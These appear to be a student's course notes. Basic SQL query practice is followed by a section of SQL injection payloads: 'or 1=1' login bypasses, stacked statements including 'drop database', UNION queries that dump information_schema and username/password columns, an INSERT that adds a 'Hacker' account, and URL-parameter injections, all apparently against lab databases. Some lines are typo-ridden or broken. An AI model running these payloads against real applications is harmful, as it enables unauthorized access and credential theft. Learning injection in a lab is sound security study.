
# SQL 1-11
```sql
mysql
show DATABASE
use SESSION
#viewing table SESSION
show TABLES /*this will show the currrent tables in the SESSION*/
select * from Tires /*This will allow you to view the selections under the tires table*/
SELECT * from user;
SELECT name,pass from user;
SELECT * from Tires UNION Select * from user; /*This won't work due to the two tables not having the same amount of columns*/
@@version - /*This will show you the current version of the database*/
Select * Tires UNION Select 1, "test" ,3,4
----\
/*List the last four Pixar movies released (ordered from most recent to least)*/
SELECT title, year FROM movies
ORDER BY year DESC
LIMIT 4;
/*List the first five Pixar movies sorted alphabetically*/
SELECT title FROM movies
ORDER BY Title ASC
LIMIT 5 /*next 5 add offset*/
OFFSET 5
/*List all the Canadian cities and their populations*/
SELECT * FROM north_american_cities 
WHERE Country LIKE "%Canada%"
/*Order all the cities in the United States by their latitude from north to south*/
SELECT city, latitude FROM north_american_cities
WHERE country = "United States"
ORDER BY latitude DESC;
/*List the two largest cities in Mexico (by population)*/
SELECT city, longitude FROM north_american_cities
WHERE longitude < -87.629798
ORDER BY longitude ASC;
/*List the two largest cities in Mexico (by population) */
SELECT city, population FROM north_american_cities
WHERE country LIKE "Mexico"
ORDER BY population DESC
LIMIT 211
/*List the third and fourth largest cities (by population) in the United States and their population*/
SELECT city, population FROM north_american_cities
WHERE country LIKE "United States"
ORDER BY population DESC
LIMIT 2
OFFSET 2;
/*Show the sales numbers for each movie that did better internationally rather than domestically*/
SELECT title, domestic_sales, international_sales
FROM movies
  JOIN boxoffice
    ON movies.id = boxoffice.movie_id
WHERE international_sales > domestic_sales;
/*List all the movies by their ratings in descending order*/
SELECT title, Rating
FROM movies
  JOIN boxoffice
    ON movies.id = boxoffice.movie_id
ORDER BY Rating DESC
```
# 11-13
```sql
BEFORE INPUT
SELECT Id FROM users WHERE name='rob' AND pass='bob'
injecting statement in passfield(true statement)
SELECT Id FROM users WHERE name='rob' OR 1='1' AND pass='rob' OR 1='1'
SELECT name,pass from user WHERE name='rob' OR 1='1';
/*stacking Statements*/
select * from Tires; Select * from user
create database test 
drop database test
/*ignore the rest*/
create DATABASE test;# drop DATABASE test;
/*sql nesting is it sanitized*/
STEP1 true stamenet, it is grabale
Audi' or 1='1
Ford' or 1='1
RAM' or 1='1

/*how to pull out all information from a table */
STEP 2Audi' UNION SELECT 1,2,3,4,5;#'
/* sql nesting is it sanitized */
UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
/*Golden Statement */
STEP 3UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
----------------------------------------------------------------------------------------
/* ADD YOUR GOD DAMN QUOTES!!!!!!!!!!!!!
- these are used to pull columns from a database to find key information
*/
Audi UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #                          
Audi UNION SELECT 1,2,3,table_schema,table_name FROM information_schema.tables; #  
Audi UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #     -- "Golden" statement 
Audi UNION SELECT 1,2,3,name,size FROM session.Tires; #    
Audi UNION SELECT @@version,database(),3,name,size FROM session.Tires; #
````
Audi' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables #     ''      
RAM' UNION SELECT table_schema,table_name FROM sqlinjection; #
RAM 
RAM' UNION SELECT table_name(name of the table), column_name(name of the column) FROM information_schema.columns; # 
-------------------------------------------------------------------

RAM' UNION SELECT id, order FROM sqlinjection.payments; #'
RAM' UNION SELECT mime,data FROM sqlinjection.share4;# 
INSERT INTO members ('Hacker', '', 'Hacker', 'hacker', 'hacker@email.com', 1)
 VALUES ('Hacker', '', 'Hacker', 'hacker', 'hacker@email.com', 1) 
INSERT INTO members (first_name, last_name, username, password, email, permission) VALUES ('''', '''', ''', '''', '''', 3) 
hacker1', 'hacker@email.com', 1)#

-------------------------------------------------------------------

/*finding the version */
RAM' UNION SELECT @@version,database(); #
RAM' UNION SELECT username, password FROM sqlinjection.payments; # good
RAM' UNION SELECT 1, column_name FROM sqlinjection.tables; #
RAM' UNION SELECT table_name, column_name FROM information_schema.columns; #  THIS ONE TO START  ''                
RAM' UNION SELECT id, name FROM sqlinjection.catagories; #
Audi' UNION SELECT username,NULL,passwd,4,5 FROM session.userinfo;#           ''
/* SINGLE QUOTES, SPELLING, NULL, CORRECT COLUMNS, CORRECT DATABASE*/       
----------------------------------------------------------------------------------------
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car
/* Gl into the web browser to edit the java stuff */
inspect -> change POST to get -> UN: bobby PW Audi' or 1='1
SELECT name, descpoolription, price FROM products WHERE category=

